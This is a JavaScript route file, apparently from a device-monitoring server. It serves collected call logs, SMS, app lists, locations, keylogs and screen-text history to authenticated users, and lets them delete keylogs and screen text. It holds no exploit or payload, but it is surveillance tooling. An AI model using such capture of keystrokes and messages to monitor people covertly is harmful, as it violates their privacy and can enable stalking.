// routes/device-telemetry.js — Per-device pull-based telemetry reads: call log, SMS, app list,
// battery stats, geofences+geo alerts, keylogs, and screen-text history.
// Extracted from server.js L12915-13007 (93 lines, 9 routes). Registered in place via
// require('./routes/device-telemetry')({ ...deps }) AFTER app.use(requireAuth) — the calls/sms/apps/
// battery-stats routes list no auth middleware of their own and rely on the global
// app.use(requireAuth); the rest additionally pass requireAuth + requireDeviceAccess/requirePerm.
module.exports = ({ app, ALL_ROWS, db, decryptText, kv, maybeRespondWithZkPayloads, requireAuth, requireDeviceAccess, requirePerm, stmts }) => {

// ── Calls / SMS / Browser API ─────────────────────────────────────────────
app.get('/api/devices/:id/calls', requireDeviceAccess, requirePerm('calls'), async (req, res) => {
  if ((await maybeRespondWithZkPayloads(req, res, 'call_log'))) return;
  const row = (await stmts.latestCallLog.get(req.params.id));
  if (!row) return res.json([]);
  try { res.json(JSON.parse(decryptText(row.data))); } catch { res.json([]); }
});

app.get('/api/devices/:id/sms', requireDeviceAccess, requirePerm('sms'), async (req, res) => {
  if ((await maybeRespondWithZkPayloads(req, res, 'sms_list'))) return;
  const row = (await stmts.latestSms.get(req.params.id));
  if (!row) return res.json([]);
  try { res.json(JSON.parse(decryptText(row.data))); } catch { res.json([]); }
});

app.get('/api/devices/:id/apps', requireDeviceAccess, requirePerm('apps'), async (req, res) => {
  if ((await maybeRespondWithZkPayloads(req, res, 'app_list'))) return;
  const row = (await stmts.latestAppList.get(req.params.id));
  if (!row) return res.json([]);
  try { res.json(JSON.parse(decryptText(row.data))); } catch { res.json([]); }
});

app.get('/api/devices/:id/battery-stats', requireDeviceAccess, requirePerm('apps'), async (req, res) => {
  if ((await maybeRespondWithZkPayloads(req, res, 'battery_stats'))) return;
  res.json(await kv.getJSON('battery:' + req.params.id));
});

app.get('/api/devices/:id/geofences', requireAuth, requireDeviceAccess, async (req, res) => {
  if ((await maybeRespondWithZkPayloads(req, res, 'geofence_list', 'geofence_alert'))) return;
  res.json({
    geofences: (await kv.getJSON('geofences:' + req.params.id)) || [],
    alerts:    (await kv.getJSON('geoalerts:' + req.params.id)) || []
  });
});

app.delete('/api/devices/:id/keylogs', requireAuth, requireDeviceAccess, requirePerm('keylogs'), async (req, res) => {
  (await stmts.delDevKeylogs.run(req.params.id));
  res.json({ ok: true });
});

app.get('/api/devices/:id/keylogs', requireAuth, requireDeviceAccess, requirePerm('keylogs'), async (req, res) => {
  if ((await maybeRespondWithZkPayloads(req, res, 'keylog_data'))) return;
  const rows = (await stmts.listKeylogs.all(req.params.id));
  // Each row is a batch; flatten into a single array sorted oldest-first
  const all = [];
  for (const row of rows) {
    try {
      const entries = JSON.parse(decryptText(row.data));
      if (Array.isArray(entries)) all.push(...entries);
    } catch {}
  }
  all.sort((a, b) => (a.ts || 0) - (b.ts || 0));
  res.json(all);
});

// ── Screen text API ────────────────────────────────────────────────────────
// Returns pull-based UI text snapshots captured by ScreenTextHelper (system/root builds).
// Each entry is a point-in-time snapshot of all visible text nodes for the foreground package.
app.delete('/api/devices/:id/screen-text', requireAuth, requireDeviceAccess, requirePerm('screentext'), async (req, res) => {
  (await stmts.delDevScreenText.run(req.params.id));
  res.json({ ok: true });
});

app.get('/api/devices/:id/screen-text', requireAuth, requireDeviceAccess, requirePerm('screentext'), async (req, res) => {
  // Windows RA devices capture SERVER-SIDE: the bastion drain poller stores UIA text into
  // screen_text_entries encrypted with the server key. Zero-knowledge never applies to that
  // pipeline — but a public-account owner of a Windows RA box would otherwise be served an
  // always-empty zk_payloads list while their captures quietly piled up in the store. Skip
  // the ZK branch for these devices and serve from the store like non-ZK devices.
  const _stDev = (await db.prepare("SELECT platform, agent_kind FROM devices WHERE id=?").get(req.params.id));
  const _isWinRa = _stDev?.platform === 'windows' && _stDev?.agent_kind === 'remote_assist';
  if (!_isWinRa && (await maybeRespondWithZkPayloads(req, res, 'screen_text_data', 'lockscreen_layout'))) return;
  // ?limit=all lifts the normal cap so the "Ask AI" export can pull the FULL retained
  // history. The tab display passes an explicit page size (default 500); ?before=<ts>
  // pages older history one window at a time for the "Load older" button.
  const lq    = /** @type {any} */ (req.query.limit);
  const limit = (lq === 'all' || (parseInt(lq, 10) || 0) < 0)
    ? ALL_ROWS
    : Math.min(parseInt(lq, 10) || 500, 2000);
  const before = parseInt(/** @type {any} */ (req.query.before), 10) || 0;
  const rows  = before > 0
    ? (await stmts.listScreenTextBefore.all(req.params.id, before, limit))
    : (await stmts.listScreenText.all(req.params.id, limit));
  const results = [];
  for (const row of rows) {
    try {
      const parsed = JSON.parse(decryptText(row.data));
      results.push({ id: row.id, ts: row.timestamp, pkg: row.pkg, ...parsed });
    } catch {}
  }
  results.reverse(); // oldest first
  res.json(results);
});

};
